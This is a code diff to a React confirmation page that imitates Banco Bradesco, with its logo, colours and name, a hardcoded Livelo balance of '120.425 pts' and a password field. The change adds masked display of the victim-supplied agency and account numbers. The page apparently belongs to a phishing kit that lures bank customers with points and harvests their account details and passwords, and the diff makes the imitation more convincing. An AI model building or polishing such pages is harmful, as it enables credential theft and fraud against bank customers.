@@ -4,9 +4,16 @@ import bradescoLogo from "@/assets/bradesco-logo.png";
 
 const Confirmacao = () => {
   const location = useLocation();
-  const { nome, conta } = (location.state as any) || {};
+  const { nome, conta, agencia } = (location.state as any) || {};
   const [senha, setSenha] = useState("");
   const [selected, setSelected] = useState<"fatura" | "saldo">("saldo");
+
+  // Mask: show only last 2 digits of agencia and last 3 digits of conta (with dash)
+  const maskedAgencia = agencia ? `**${agencia.slice(-2)}` : "**--";
+  const cleanConta = conta ? conta.replace(/\D/g, "") : "";
+  const maskedConta = cleanConta.length >= 2
+    ? `***${cleanConta.slice(-3, -1)}-${cleanConta.slice(-1)}`
+    : "***---";
 
   return (
     <div className="min-h-screen max-w-md mx-auto relative flex flex-col" style={{ background: 'linear-gradient(135deg, #D7004D 0%, #A30032 100%)' }}>
@@ -21,7 +28,7 @@ const Confirmacao = () => {
         <p className="text-muted-foreground text-xs mb-1">Detalhes</p>
         <p className="text-foreground text-sm font-semibold">237 - BANCO BRADESCO S.A.</p>
         <p className="text-muted-foreground text-xs">Conta Corrente Individual</p>
-        <p className="text-muted-foreground text-xs mt-1">{conta || "---"}</p>
+        <p className="text-muted-foreground text-xs mt-1">{maskedAgencia} / {maskedConta}</p>
         <div className="flex items-center justify-between mt-4">
           <span className="text-foreground font-bold text-base italic">livelo</span>
           <span className="text-[#D7004D] font-bold text-lg">120.425 pts</span>
